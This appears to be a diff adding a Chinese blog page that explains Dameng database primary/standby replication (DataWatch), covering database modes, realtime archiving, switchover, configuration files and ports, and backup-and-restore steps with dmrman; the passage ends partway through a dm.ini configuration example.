@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>达梦数据库 主备 - 编程随想</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="达梦数据库 主备" />
+<meta property="og:description" content="实时主备由一个主库以及一个或者多个配置了实时（Realtime）归档的备库组成，其主要目的是保障数据库可用性，提高数据安全性。实时主备系统中，主库提供完整的数据库功能，备库提供只读服务。主库修改数据产生的Redo日志，通过实时归档机制，在写入联机Redo日志文件之前发送到备库，实时备库通过重演Redo日志与主库保持数据同步。当主库出现故障时，备库在将所有Redo日志重演结束后，就可以切换为主库对外提供数据库服务。
+DM数据守护（DataWatch）的实现原理非常简单：将主库（生产库）产生的Redo日志传输到备库，备库接收并重新应用Redo日志，从而实现备库与主库的数据同步。DM数据守护的核心思想是监控数据库状态，获取主、备库数据同步情况，为Redo日志传输与重演过程中出现的各种异常情况提供一系列的解决方案。
+数据库与数据库实例数据库（Database）是一个文件集合（包括数据文件、临时文件、重做日志文件和控制文件），保存在物理磁盘或文件系统中。数据库实例（Instance）就是一组操作系统进程（或者是一个多线程的进程）以及一些内存。通过数据库实例，可以操作数据库，一般情况下，我们访问、修改数据库都是通过数据库实例来完成的。
+主库Primary模式，提供完整数据库服务的实例，一般来说主库是用来直接支撑应用系统的生产库。备库Standby模式，提供只读数据库服务的实例。备库除了用于容灾，还可以提供备份、查询等只读功能，并且备库还支持临时表的Insert/Delete/Update操作。备库支持临时表修改主要基于两个因素：1.临时表数据的修改不会产生Redo日志，主库对临时表的修改无法同步到备库；2.可以提供更大灵活性，适应更多应用场景。
+根据数据同步情况，备库又可以分为可切换备库和不可切换备库。可切换备库是指，主备库之间数据完全同步，主库发生故障、备库切换为主库后，不会造成任何数据丢失的备库。
+DM支持3种数据库模式：Normal模式、Primary模式和Standby模式。
+Normal模式提供正常的数据库服务，操作没有限制。正常生成本地归档，但不发送实时归档（Realtime）、即时归档（Timely）和异步归档（Async）。
+Primary模式提供正常的数据库服务，操作有极少限制。该模式下部分功能受限，包括：不支持修改表空间文件名、不支持修改arch_ini参数。正常生成本地归档，支持实时归档（Realtime）、即时归档（Timely）和异步归档（Async）。Primary模式下，对临时表空间以外的所有的数据库对象的修改操作都强制生成Redo日志。
+Standby模式可以执行数据库备份、查询等只读数据库操作。正常生成本地归档，正常发送异步归档Redo日志；但实时归档（Realtime）、即时归档（Timely）均强制失效。该模式下时间触发器、事件触发器等都失效。
+可以通过SQL语句切换数据库模式，模式切换必须在Mount状态下执行。
+切换模式SQL语句如下：
+将数据库切换为Primary模式：ALTERDATABASEPRIMARY;
+将数据库切换为Standby模式：ALTERDATABASESTANDBY;
+将数据库切换为Normal模式：ALTERDATABASENORMAL;
+修改DMDSC库的模式必须在DMDSC库所有实例都处于MOUNT状态下才能进行，只需要在一个节点上执行以上语句即可。
+实时归档（Realtime）将主库产生的Redo日志通过MAL系统传递到备库，实时归档是实时主备和MPP主备的实现基础。实时归档只在主库生效，一个主库可以配置1~8个实时备库。
+实时归档的执行流程是，主库在Redo日志（RLOG_PKG）写入联机日志文件前，将Redo日志发送到备库，备库收到Redo日志（RLOG_PKG）后标记为KEEP_PKG，将原KEEP_PKG加入日志重演任务系统，并马上响应主库，不需要等待Redo日志重演结束后再响应主库。
+主库收到备库的响应消息，确认备库已经收到Redo日志后，再将Redo日志写入联机日志文件中。
+实时主备 实时主备系统由主库、实时备库、守护进程和监视器组成。通过部署实时主备系统，可以及时检测并处理各种硬件故障、数据库实例异常，确保持续提供数据库服务。
+实时主备系统主要功能包括：
+1.实时数据同步主备库通过实时归档完成数据同步，实时归档要求主库将RLOG_PKG发送到备库后，再将RLOG_PKG写入本地联机Redo日志文件。但要注意的是，备库确认收到主库发送的Redo日志，并不保证备库已经完成重演这些Redo日志，因此主备库之间的数据同步存在一定的时间差。
+2.主备库切换主备库正常运行过程中，可以通过监视器的Switchover命令，一键完成主备库角色转换。主备库切换功能可以确保在软、硬件升级，或系统维护时，提供不间断的数据库服务。
+3.自动故障处理备库故障，不影响主库正常提供数据库服务，守护进程自动通知主库修改实时归档为Invalid状态，将实时备库失效。
+4.自动数据同步备库故障恢复后，守护进程自动通知主库发送归档Redo日志，重新进行主备库数据同步。并在历史数据同步后，修改主库的实时归档状态为Valid，恢复实时备库功能。备库接管后，原主库故障恢复，守护进程自动修改原主库的模式为Standby，并重新作为备库加入主备系统。
+5.备库接管
+主库发生故障后，可以通过监视器的Takeover命令，将备库切换为主库，继续对外提供服务。如果配置为自动切换模式，确认监视器可以自动检测主库故障，并通知备库接管，这个过程不需要人工干预。
+6.备库强制接管如果执行Takeover命令不成功，但主库可能由于硬件损坏等原因无法马上恢复，为了及时恢复数据库服务，DM提供了TakeoverForce命令，强制将备库切换为主库。但需要由用户确认主库故障前，主库与接管备库的数据是一致的（主库到备库的归档是Valid状态），避免引发守护进程组分裂。
+7.读写分离访问在备库查询的实时性要求不高的条件下，实时主备也可以配置接口的读写分离属性访问，实现读写分离功能特性。
+与DM数据守护相关的配置文件包括：
+数据库配置文件dm.ini数据库控制文件dm.ctlMAL配置文件dmmal.iniRedo日志归档配置文件dmarch.ini守护进程配置文件dmwatcher.ini监视器配置文件dmmonitor.ini定时器配置文件dmtimer.iniMPP控制文件dmmpp.ctl dm.ctl不需要用户修改，只要放在指定的目录即可。
+各配置文件的存放路径：
+1.dm.ini存放目录没有限制，一般直接放在数据库目录中。
+2.dmmal.ini、dmarch.ini、dmtimer.ini存放目录由dm.ini的CONFIG_PATH配置项指定
+3.dmwatcher.ini存放目录没有限制，一般和dm.ini存放在同一个目录。
+4.dmmonitor.ini存放目录没有限制，一般和dm.ini存放在同一个目录。
+5.dm.ctl存放目录由dm.ini的CTL_PATH配置项指定。
+6.dmmpp.ctl存放目录由dm.ini的SYSTEM_PATH配置项指定。
+端口配置关系说明 对上述ini文件中的各个端口之间的对应关系说明如下。
+dm.ini dm.ini中端口相关的有两个配置项：PORT_NUM、DW_PORT。PORT_NUM是数据库实例的监听端口，监听用户的连接请求，dmmal.ini中的[MAL_INST_NAME:MAL_INST_PORT]要与dm.ini中的[INSTANCE_NAME:PORT_NUM]保持一致。 DW_PORT是守护系统中数据库监听守护进程连接请求的端口，由守护进程主动建立到数据库的TCP连接，这个端口只用于数据库和守护进程之间的消息交互使用。DM8版本支持DMDSC数据守护后，该参数转移到dmmal.ini的MAL_INST_DW_PORT，dm.ini中无需设置。
+dmmal.ini dmmal.ini中每个实例都有一个单独的mal配置项，每个实例中有以下几个端口相关的配置：MAL_PORT、MAL_INST_PORT、MAL_DW_PORT、MAL_INST_DW_PORT。 MAL_PORTMAL监听端口，用于创建MAL链路，同一个实例的MAL配置项中，MAL_PORT不能和实例dm.ini中的两个端口相同，避免端口绑定冲突。MAL_INST_PORT MAL配置项中，MAL_INST_NAME实例的监听端口，和实例dm.ini的PORT_NUM值相同。
+MAL_DW_PORT守护进程监听端口，其他守护进程或监视器使用MAL_HOST&#43;MAL_DW_PORT创建TCP连接。监视器配置文件dmmonitor.ini中，MON_DW_IP就是一组MAL_HOST:MAL_DW_PORT。
+MAL_INST_DW_PORT实例对守护进程的监听端口，守护进程使用MAL_HOST&#43;MAL_INST_DW_PORT创建到实例的TCP连接。
+3.dmwatcher.ini守护进程启动时，需要获取远程实例对应的配置项信息，创建到远程守护进程的TCP连接，这些信息通过INST_INI配置项来获取。守护进程从INST_INI路径找到并读取dm.ini、dmmal.ini、dmarch.ini，综合各个配置项得到远程守护进程的IP、端口等信息并建立连接。
+4.dmmonitor.ini监视器配置项中以守护进程组为单位，通过MON_DW_IP配置到每组的所有守护进程的IP和端口信息。配置格式为：“守护进程IP地址:守护进程TCP端口”。其中守护进程IP地址和dmmal.ini中的MAL_HOST保持一致，守护进程TCP端口和dmmal.ini中的MAL_DW_PORT保持一致。dmmal.ini中配置有多少个IP和PORT，dmmonitor.ini就需要配置多少个对应124的“IP:PORT”信息，否则会无法接收到消息。
+配置DM数据守护，一般要求配置连接服务名，以实现故障自动重连。连接服务名可以在DM提供的JDBC、DPI等接口中使用，连接数据库时指定连接服务名，接口会随机选择一个IP进行连接，如果连接不成功或者服务器状态不正确，则顺序获取下一个IP进行连接，直至连接成功或者遍历了所有IP。可以通过编辑dm_svc.conf文件配置连接服务名。dm_svc.conf配置文件在DM安装时生成，Windows平台下位于%SystemRoot%\system32目录，Linux平台下位于/etc目录。
+连接服务名格式：SERVERNAME=(IP[:PORT],IP[:PORT],......)
+例如，配置一个名为dw_svc的连接服务名，使用dw_svc连接数据守护中的数据库，即可实现故障自动重连。dw_svc=(192.168.1.131:5236,192.168.1.132:5236)
+LOGIN_MODE=(1)
+SWITCH_TIME=(3)
+SWITCH_INTERVAL=(1000)
+dm_svc.conf的详细设置，请参考《DM8系统管理员手册》
+主备库切换 主库维护，滚动升级等场景，可以执行Switchover命令，实现主备库切换。如果存在多个备库，需要先执行ChooseSwitchover命令，选出守护进程组中可以切换的备库。
+ChooseSwitchover命令选择可切换备库的条件如下：
+1.主库守护进程是Open状态
+2.备库守护进程是Open状态
+3.主、备库的OPEN记录项内容相同，并且守护进程控制文件是Valid有效状态（内存值）
+4.主库正常运行
+5.备库正常运行
+6.主库处于Open状态
+7.备库处于Open状态" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/1a561080ce1c099ba44ab30be2e3050f/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-03-26T22:19:44+08:00" />
+<meta property="article:modified_time" content="2020-03-26T22:19:44+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程随想" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程随想</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">达梦数据库 主备</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <p style="margin-left:0cm;">实时主备由一个主库以及一个或者多个配置了实时（Realtime）归档的备库组成，其主要目的是保障数据库可用性，提高数据安全性。实时主备系统中，主库提供完整的数据库功能，备库提供只读服务。主库修改数据产生的Redo日志，通过实时归档机制，在写入联机Redo日志文件之前发送到备库，实时备库通过重演Redo日志与主库保持数据同步。当主库出现故障时，备库在将所有Redo日志重演结束后，就可以切换为主库对外提供数据库服务。</p> 
+<p style="margin-left:0cm;">DM数据守护（DataWatch）的实现原理非常简单：将主库（生产库）产生的Redo日志传输到备库，备库接收并重新应用Redo日志，从而实现备库与主库的数据同步。DM数据守护的核心思想是监控数据库状态，获取主、备库数据同步情况，为Redo日志传输与重演过程中出现的各种异常情况提供一系列的解决方案。</p> 
+<p style="margin-left:0cm;">数据库与数据库实例数据库（Database）是一个文件集合（包括数据文件、临时文件、重做日志文件和控制文件），保存在物理磁盘或文件系统中。数据库实例（Instance）就是一组操作系统进程（或者是一个多线程的进程）以及一些内存。通过数据库实例，可以操作数据库，一般情况下，我们访问、修改数据库都是通过数据库实例来完成的。</p> 
+<p style="margin-left:0cm;">主库Primary模式，提供完整数据库服务的实例，一般来说主库是用来直接支撑应用系统的生产库。备库Standby模式，提供只读数据库服务的实例。备库除了用于容灾，还可以提供备份、查询等只读功能，并且备库还支持临时表的Insert/Delete/Update操作。备库支持临时表修改主要基于两个因素：1.临时表数据的修改不会产生Redo日志，主库对临时表的修改无法同步到备库；2.可以提供更大灵活性，适应更多应用场景。</p> 
+<p style="margin-left:0cm;">根据数据同步情况，备库又可以分为可切换备库和不可切换备库。可切换备库是指，主备库之间数据完全同步，主库发生故障、备库切换为主库后，不会造成任何数据丢失的备库。</p> 
+<p style="margin-left:0cm;">DM支持3种数据库模式：Normal模式、Primary模式和Standby模式。</p> 
+<p style="margin-left:0cm;">Normal模式提供正常的数据库服务，操作没有限制。正常生成本地归档，但不发送实时归档（Realtime）、即时归档（Timely）和异步归档（Async）。</p> 
+<p style="margin-left:0cm;">Primary模式提供正常的数据库服务，操作有极少限制。该模式下部分功能受限，包括：不支持修改表空间文件名、不支持修改arch_ini参数。正常生成本地归档，支持实时归档（Realtime）、即时归档（Timely）和异步归档（Async）。Primary模式下，对临时表空间以外的所有的数据库对象的修改操作都强制生成Redo日志。</p> 
+<p style="margin-left:0cm;">Standby模式可以执行数据库备份、查询等只读数据库操作。正常生成本地归档，正常发送异步归档Redo日志；但实时归档（Realtime）、即时归档（Timely）均强制失效。该模式下时间触发器、事件触发器等都失效。</p> 
+<p style="margin-left:0cm;">可以通过SQL语句切换数据库模式，模式切换必须在Mount状态下执行。</p> 
+<p style="margin-left:0cm;">切换模式SQL语句如下：</p> 
+<p style="margin-left:0cm;">将数据库切换为Primary模式：ALTERDATABASEPRIMARY;</p> 
+<p style="margin-left:0cm;">将数据库切换为Standby模式：ALTERDATABASESTANDBY;</p> 
+<p style="margin-left:0cm;">将数据库切换为Normal模式：ALTERDATABASENORMAL;</p> 
+<p style="margin-left:0cm;">修改DMDSC库的模式必须在DMDSC库所有实例都处于MOUNT状态下才能进行，只需要在一个节点上执行以上语句即可。</p> 
+<p style="margin-left:0cm;">实时归档（Realtime）将主库产生的Redo日志通过MAL系统传递到备库，实时归档是实时主备和MPP主备的实现基础。实时归档只在主库生效，一个主库可以配置1~8个实时备库。</p> 
+<p style="margin-left:0cm;">实时归档的执行流程是，主库在Redo日志（RLOG_PKG）写入联机日志文件前，将Redo日志发送到备库，备库收到Redo日志（RLOG_PKG）后标记为KEEP_PKG，将原KEEP_PKG加入日志重演任务系统，并马上响应主库，不需要等待Redo日志重演结束后再响应主库。</p> 
+<p style="margin-left:0cm;">主库收到备库的响应消息，确认备库已经收到Redo日志后，再将Redo日志写入联机日志文件中。</p> 
+<ol><li>实时主备</li></ol> 
+<p style="margin-left:0cm;">实时主备系统由主库、实时备库、守护进程和监视器组成。通过部署实时主备系统，可以及时检测并处理各种硬件故障、数据库实例异常，确保持续提供数据库服务。</p> 
+<p style="margin-left:0cm;">实时主备系统主要功能包括：</p> 
+<p style="margin-left:0cm;">1.实时数据同步主备库通过实时归档完成数据同步，实时归档要求主库将RLOG_PKG发送到备库后，再将RLOG_PKG写入本地联机Redo日志文件。但要注意的是，备库确认收到主库发送的Redo日志，并不保证备库已经完成重演这些Redo日志，因此主备库之间的数据同步存在一定的时间差。</p> 
+<p style="margin-left:0cm;">2.主备库切换主备库正常运行过程中，可以通过监视器的Switchover命令，一键完成主备库角色转换。主备库切换功能可以确保在软、硬件升级，或系统维护时，提供不间断的数据库服务。</p> 
+<p style="margin-left:0cm;">3.自动故障处理备库故障，不影响主库正常提供数据库服务，守护进程自动通知主库修改实时归档为Invalid状态，将实时备库失效。</p> 
+<p style="margin-left:0cm;">4.自动数据同步备库故障恢复后，守护进程自动通知主库发送归档Redo日志，重新进行主备库数据同步。并在历史数据同步后，修改主库的实时归档状态为Valid，恢复实时备库功能。备库接管后，原主库故障恢复，守护进程自动修改原主库的模式为Standby，并重新作为备库加入主备系统。</p> 
+<p style="margin-left:0cm;">5.备库接管</p> 
+<p style="margin-left:0cm;">主库发生故障后，可以通过监视器的Takeover命令，将备库切换为主库，继续对外提供服务。如果配置为自动切换模式，确认监视器可以自动检测主库故障，并通知备库接管，这个过程不需要人工干预。</p> 
+<p style="margin-left:0cm;">6.备库强制接管如果执行Takeover命令不成功，但主库可能由于硬件损坏等原因无法马上恢复，为了及时恢复数据库服务，DM提供了TakeoverForce命令，强制将备库切换为主库。但需要由用户确认主库故障前，主库与接管备库的数据是一致的（主库到备库的归档是Valid状态），避免引发守护进程组分裂。</p> 
+<p style="margin-left:0cm;">7.读写分离访问在备库查询的实时性要求不高的条件下，实时主备也可以配置接口的读写分离属性访问，实现读写分离功能特性。</p> 
+<p style="margin-left:0cm;">与DM数据守护相关的配置文件包括：</p> 
+<ol><li>数据库配置文件dm.ini</li><li>数据库控制文件dm.ctl</li><li>MAL配置文件dmmal.ini</li><li>Redo日志归档配置文件dmarch.ini</li><li>守护进程配置文件dmwatcher.ini</li><li>监视器配置文件dmmonitor.ini</li><li>定时器配置文件dmtimer.ini</li><li>MPP控制文件dmmpp.ctl</li></ol> 
+<p style="margin-left:0cm;">dm.ctl不需要用户修改，只要放在指定的目录即可。</p> 
+<p style="margin-left:0cm;">各配置文件的存放路径：</p> 
+<p style="margin-left:0cm;">1.dm.ini存放目录没有限制，一般直接放在数据库目录中。</p> 
+<p style="margin-left:0cm;">2.dmmal.ini、dmarch.ini、dmtimer.ini存放目录由dm.ini的CONFIG_PATH配置项指定</p> 
+<p style="margin-left:0cm;">3.dmwatcher.ini存放目录没有限制，一般和dm.ini存放在同一个目录。</p> 
+<p style="margin-left:0cm;">4.dmmonitor.ini存放目录没有限制，一般和dm.ini存放在同一个目录。</p> 
+<p style="margin-left:0cm;">5.dm.ctl存放目录由dm.ini的CTL_PATH配置项指定。</p> 
+<p style="margin-left:0cm;">6.dmmpp.ctl存放目录由dm.ini的SYSTEM_PATH配置项指定。</p> 
+<ol><li>端口配置关系说明</li></ol> 
+<p style="margin-left:0cm;">对上述ini文件中的各个端口之间的对应关系说明如下。</p> 
+<ol><li>dm.ini dm.ini中端口相关的有两个配置项：PORT_NUM、DW_PORT。PORT_NUM是数据库实例的监听端口，监听用户的连接请求，dmmal.ini中的[MAL_INST_NAME:MAL_INST_PORT]要与dm.ini中的[INSTANCE_NAME:PORT_NUM]保持一致。</li></ol> 
+<p style="margin-left:0cm;">DW_PORT是守护系统中数据库监听守护进程连接请求的端口，由守护进程主动建立到数据库的TCP连接，这个端口只用于数据库和守护进程之间的消息交互使用。DM8版本支持DMDSC数据守护后，该参数转移到dmmal.ini的MAL_INST_DW_PORT，dm.ini中无需设置。</p> 
+<ol><li>dmmal.ini dmmal.ini中每个实例都有一个单独的mal配置项，每个实例中有以下几个端口相关的配置：MAL_PORT、MAL_INST_PORT、MAL_DW_PORT、MAL_INST_DW_PORT。</li></ol> 
+<p style="margin-left:0cm;">MAL_PORTMAL监听端口，用于创建MAL链路，同一个实例的MAL配置项中，MAL_PORT不能和实例dm.ini中的两个端口相同，避免端口绑定冲突。MAL_INST_PORT MAL配置项中，MAL_INST_NAME实例的监听端口，和实例dm.ini的PORT_NUM值相同。</p> 
+<p style="margin-left:0cm;">MAL_DW_PORT守护进程监听端口，其他守护进程或监视器使用MAL_HOST+MAL_DW_PORT创建TCP连接。监视器配置文件dmmonitor.ini中，MON_DW_IP就是一组MAL_HOST:MAL_DW_PORT。</p> 
+<p style="margin-left:0cm;">MAL_INST_DW_PORT实例对守护进程的监听端口，守护进程使用MAL_HOST+MAL_INST_DW_PORT创建到实例的TCP连接。</p> 
+<p style="margin-left:0cm;">3.dmwatcher.ini守护进程启动时，需要获取远程实例对应的配置项信息，创建到远程守护进程的TCP连接，这些信息通过INST_INI配置项来获取。守护进程从INST_INI路径找到并读取dm.ini、dmmal.ini、dmarch.ini，综合各个配置项得到远程守护进程的IP、端口等信息并建立连接。</p> 
+<p style="margin-left:0cm;">4.dmmonitor.ini监视器配置项中以守护进程组为单位，通过MON_DW_IP配置到每组的所有守护进程的IP和端口信息。配置格式为：“守护进程IP地址:守护进程TCP端口”。其中守护进程IP地址和dmmal.ini中的MAL_HOST保持一致，守护进程TCP端口和dmmal.ini中的MAL_DW_PORT保持一致。dmmal.ini中配置有多少个IP和PORT，dmmonitor.ini就需要配置多少个对应124的“IP:PORT”信息，否则会无法接收到消息。</p> 
+<p style="margin-left:0cm;">配置DM数据守护，一般要求配置连接服务名，以实现故障自动重连。连接服务名可以在DM提供的JDBC、DPI等接口中使用，连接数据库时指定连接服务名，接口会随机选择一个IP进行连接，如果连接不成功或者服务器状态不正确，则顺序获取下一个IP进行连接，直至连接成功或者遍历了所有IP。可以通过编辑dm_svc.conf文件配置连接服务名。dm_svc.conf配置文件在DM安装时生成，Windows平台下位于%SystemRoot%\system32目录，Linux平台下位于/etc目录。</p> 
+<p style="margin-left:0cm;">连接服务名格式：SERVERNAME=(IP[:PORT],IP[:PORT],......)</p> 
+<p style="margin-left:0cm;">例如，配置一个名为dw_svc的连接服务名，使用dw_svc连接数据守护中的数据库，即可实现故障自动重连。dw_svc=(192.168.1.131:5236,192.168.1.132:5236)</p> 
+<p style="margin-left:0cm;">LOGIN_MODE=(1)</p> 
+<p style="margin-left:0cm;">SWITCH_TIME=(3)</p> 
+<p style="margin-left:0cm;">SWITCH_INTERVAL=(1000)</p> 
+<p style="margin-left:0cm;">dm_svc.conf的详细设置，请参考《DM8系统管理员手册》</p> 
+<ol><li>主备库切换</li></ol> 
+<p style="margin-left:0cm;">主库维护，滚动升级等场景，可以执行Switchover命令，实现主备库切换。如果存在多个备库，需要先执行ChooseSwitchover命令，选出守护进程组中可以切换的备库。</p> 
+<p style="margin-left:0cm;">ChooseSwitchover命令选择可切换备库的条件如下：</p> 
+<p style="margin-left:0cm;">1.主库守护进程是Open状态</p> 
+<p style="margin-left:0cm;">2.备库守护进程是Open状态</p> 
+<p style="margin-left:0cm;">3.主、备库的OPEN记录项内容相同，并且守护进程控制文件是Valid有效状态（内存值）</p> 
+<p style="margin-left:0cm;">4.主库正常运行</p> 
+<p style="margin-left:0cm;">5.备库正常运行</p> 
+<p style="margin-left:0cm;">6.主库处于Open状态</p> 
+<p style="margin-left:0cm;">7.备库处于Open状态</p> 
+<p style="margin-left:0cm;">8.主库到备库的归档是Valid状态</p> 
+<p style="margin-left:0cm;">假定选出的可切换备库是B，Switchover切换流程如下：</p> 
+<p style="margin-left:0cm;">1.通知主备库守护进程，切换为Switchover状态</p> 
+<p style="margin-left:0cm;">2.通知主库(A)Mount</p> 
+<p style="margin-left:0cm;">3.实时或MPP主备环境下，通知备库(B)APPLYKEEP_RLOG_PKG</p> 
+<p style="margin-left:0cm;">4.通知备库(B)Mount</p> 
+<p style="margin-left:0cm;">5.通知(A)切换为Standby模式</p> 
+<p style="margin-left:0cm;">6.MPP主备环境下，通知(A)修改MPP_INI内存值为0</p> 
+<p style="margin-left:0cm;">7.通知(B)切换为Primary模式</p> 
+<p style="margin-left:0cm;">8.通知(B)修改所有归档目标的归档状态为无效</p> 
+<p style="margin-left:0cm;">9.MPP主备需要通知各组活动主库更新dmmpp.ctl文件，参考后文说明</p> 
+<p style="margin-left:0cm;">10.通知新的备库(A)Open</p> 
+<p style="margin-left:0cm;">11.通知新的主库(B)Open</p> 
+<p style="margin-left:0cm;">12.通知主备库守护进程切换为Open状态</p> 
+<p style="margin-left:0cm;">13.清理所有守护进程上记录的监视器命令执行信息</p> 
+<p style="margin-left:0cm;">注意;主备库切换在实现逻辑上等同于主备库正常状态下用户主动发起的Takeover操作。Swithover完成后，主备库之间数据是不完全同步的，要由新主库B的守护进程通过Recovery流程，重新同步数据到新备库A。Switchover命令会修改切换后主库守护进程INST_RECOVER_TIME内存值为3秒（默认60秒），确保尽快启动故障恢复流程，同步主库数据完成后，重新将归档设置为Valid状态。在故障恢复流程完成之前，再次执行Switchover命令会报错，如果主库故障，备库接管将会报错；备库强制接管会引发守护进程组分裂.</p> 
+<ol><li>数据守护搭建</li></ol> 
+<p style="margin-left:0cm;">在搭建数据守护系统前，应注意数据守护系统中各实例使用的DM服务器版本应一致，同时还应注意各实例所在主机的操作系统位数、大小端模式、时区及时间设置都应一致，以及使用同一个用户启动DM服务器和守护进程dmwatcher，以免系统在运行时出现意想不到的错误。</p> 
+<ol><li> 
+  <ol><li>数据准备</li></ol></li></ol> 
+<p style="margin-left:0cm;">配置数据守护V4.0之前，必须先通过备份还原方式同步各数据库的数据，确保各数据的数据保持完全一致。主库可以是新初始化的数据库，也可以是正在生产、使用中的数据库。</p> 
+<p style="margin-left:0cm;">不能使用分别初始化库或者直接拷贝数据文件的方法，原因如下：1．每个库都有一个永久魔数（permenant_magic），一经生成，永远不会改变，主库传送日志时会判断这个值是否一样，确保是来自同一个数据守护环境中的库，否则传送不了日志。2．由于dminit初始化数据库时，会生成随机密钥用于加密，每次生成的密钥都不相同，备库无法解析采用主库密钥加密的数据。3．每个库都有一个数据库魔数（DB_MAGIC），每经过一次还原、恢复操作，DB_MAGIC就会产生变化，需要通过这种方式来区分同一个数据守护环境中各个不同的库。</p> 
+<p style="margin-left:0cm;">对于<span style="color:#FF0000;">新初始化的库，首次启动不允许使用Mount方式，需要先正常启动并正常退出，然后才允许Mount方式启动</span>。</p> 
+<p style="margin-left:0cm;"><span style="color:#FF0000;">准备数据时，如果主库是新初始化的库，先正常启动并正常退出，然后再使用备份还原方式准备备库数据。</span></p> 
+<p style="margin-left:0cm;"> </p> 
+<p style="margin-left:0cm;">如果是初始搭建环境，可以通过对主库脱机备份、对备库脱机还原的方式来准备数据，</p> 
+<p style="margin-left:0cm;">如果主库已经处于运行状态，则可以对主库进行联机备份、对备库脱机还原的方式来准备数据。</p> 
+<p style="margin-left:0cm;">两种方式都需要服务器配置本地归档，本地归档配置方式如下：</p> 
+<p style="margin-left:0cm;">1.配置dm.ini，打开ARCH_INI参数</p> 
+<p style="margin-left:0cm;">ARCH_INI=1#打开归档配置</p> 
+<p style="margin-left:0cm;">2.配置dmarch.ini</p> 
+<p style="margin-left:0cm;">[ARCHIVE_LOCAL1]ARCH_TYPE=LOCAL#本地归档类型</p> 
+<p style="margin-left:0cm;">ARCH_DEST=/dm/data/DAMENG/arch#本地归档文件存放路径ARCH_FILE_SIZE=128#单位Mb，本地单个归档文件最大值ARCH_SPACE_LIMIT=0#单位Mb，0表示无限制，范围1024~4294967294M</p> 
+<p style="margin-left:0cm;">关于备份还原更详细的说明可以参考《DM8备份与还原》。</p> 
+<p style="margin-left:0cm;">脱机备份、脱机还原方式</p> 
+<p style="margin-left:0cm;">1.正常关闭数据库</p> 
+<p style="margin-left:0cm;">2.进行脱机备份</p> 
+<p style="margin-left:0cm;">./dmrmanCTLSTMT="BACKUPDATABASE'/dm/data/DAMENG/dm.ini'FULLTOBACKUP_FILE1BACKUPSET'/dm/data/BACKUP_FILE_01'"</p> 
+<p style="margin-left:0cm;">3.拷贝备份文件到备库所在机器</p> 
+<p style="margin-left:0cm;">4.执行脱机数据库还原与恢复</p> 
+<p style="margin-left:0cm;">./dmrmanCTLSTMT="RESTOREDATABASE'/dm/data/DAMENG/dm.ini'FROMBACKUPSET'/dm/data/BACKUP_FILE_01'"</p> 
+<p style="margin-left:0cm;">./dmrmanCTLSTMT="RECOVERDATABASE'/dm/data/DAMENG/dm.ini'FROMBACKUPSET'/dm/data/BACKUP_FILE_01'"</p> 
+<p style="margin-left:0cm;">./dmrmanCTLSTMT="RECOVERDATABASE'/dm/data/DAMENG/dm.ini'UPDATEDB_MAGIC"</p> 
+<p style="margin-left:0cm;">联机备份、脱机还原方式</p> 
+<ol><li>对主库进行联机备份操作</li></ol> 
+<p style="margin-left:0cm;">SQL&gt;BACKUPDATABASEBACKUPSET'/dm/data/BACKUP_FILE_01';</p> 
+<p style="margin-left:0cm;">2.拷贝备份文件到备库所在机器</p> 
+<p style="margin-left:0cm;">3.执行脱机数据库还原与恢复</p> 
+<p style="margin-left:0cm;">./dmrmanCTLSTMT="RESTOREDATABASE'/dm/data/DAMENG/dm.ini'FROMBACKUPSET'/dm/data/BACKUP_FILE_01'"</p> 
+<p style="margin-left:0cm;">./dmrmanCTLSTMT="RECOVERDATABASE'/dm/data/DAMENG/dm.ini'FROMBACKUPSET'/dm/data/BACKUP_FILE_01'"</p> 
+<p style="margin-left:0cm;">./dmrmanCTLSTMT="RECOVERDATABASE'/dm/data/DAMENG/dm.ini'UPDATEDB_MAGIC"</p> 
+<ol><li> 
+  <ol><li>配置实时主备</li></ol></li></ol> 
+<p style="margin-left:0cm;">配置实时主备，有以下几种配置方案，可以根据实际情况部署：</p> 
+<p style="margin-left:0cm;">1.只配置主库和最多8个实时备库。</p> 
+<p style="margin-left:0cm;">2.只配置主库和最多8个异步备库。</p> 
+<p style="margin-left:0cm;">3.配置主库、最多8个实时备库，和最多8个异步备库。在实际应用中，如果数据库规模很大，并且对数据的实时性要求不是很严格，则可以配置多个异步备库用于分担统计报表等任务。</p> 
+<ol><li>操作步骤：</li></ol> 
+<p style="margin-left:0cm;">配置方案为常见的一个主库和一个实时备库。</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li>环境说明</li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">各主备库的实例名建议采用“组名_守护环境_序号”的方式命名，方便按组区分不同实例，注意总长度不能超过16。本示例中组名为“GRP1”，配置为实时主备，主库命名为“GRP1_RT_01”，备库命名为“GRP1_RT_02”</p> 
+<ol><li> 
+  <ol><li> 
+    <ol><li>数据准备</li><li>配置主库GRP1_RT_01 
+      <ol><li>配置dm.ini</li></ol></li></ol></li></ol></li></ol> 
+<p style="margin-left:0cm;">在DW_P机器上配置主库的实例名为GRP1_RT_01，dm.ini参数修改如下：#实例名，建议使用“组名_守护环境_序号”的命名方式，总长度不能超过16</p> 
+<p style="margin-left:0cm;">INSTANCE_NAME=GRP1_RT_01</p> 
